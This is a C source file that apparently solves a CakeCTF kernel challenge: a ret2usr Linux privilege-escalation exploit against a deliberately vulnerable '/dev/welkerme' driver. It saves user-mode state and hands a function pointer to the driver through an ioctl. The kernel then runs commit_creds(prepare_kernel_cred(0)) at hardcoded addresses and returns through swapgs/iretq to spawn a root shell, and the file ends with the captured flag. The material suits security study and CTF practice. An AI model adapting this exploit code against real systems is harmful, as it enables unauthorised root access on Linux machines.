#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

// Just copied this:
// https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html#ret2user-ret2usr

long long user_cs, user_ss, user_rsp, user_rflags;

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

unsigned long prepare_kernel_cred = 0xffffffff810726e0;
unsigned long commit_creds = 0xffffffff81072540;


static void escalate_privilege() {
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
  restore_state();
}

int func(void) {
    escalate_privilege();
    restore_state();
    return 0;
}

int main(void) {
    int fd, ret;

    save_state();

    if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
        perror("/dev/welkerme");
        exit(1);
    }

    ret = ioctl(fd, CMD_ECHO, 12345);
    printf("CMD_ECHO(12345) --> %d\n", ret);

    ret = ioctl(fd, CMD_EXEC, (long)func);
    printf("CMD_EXEC(func) --> %d\n", ret);

    close(fd);
    return 0;
}

// CakeCTF{b4s1cs_0f_pr1v1l3g3_3sc4l4t10n!!}

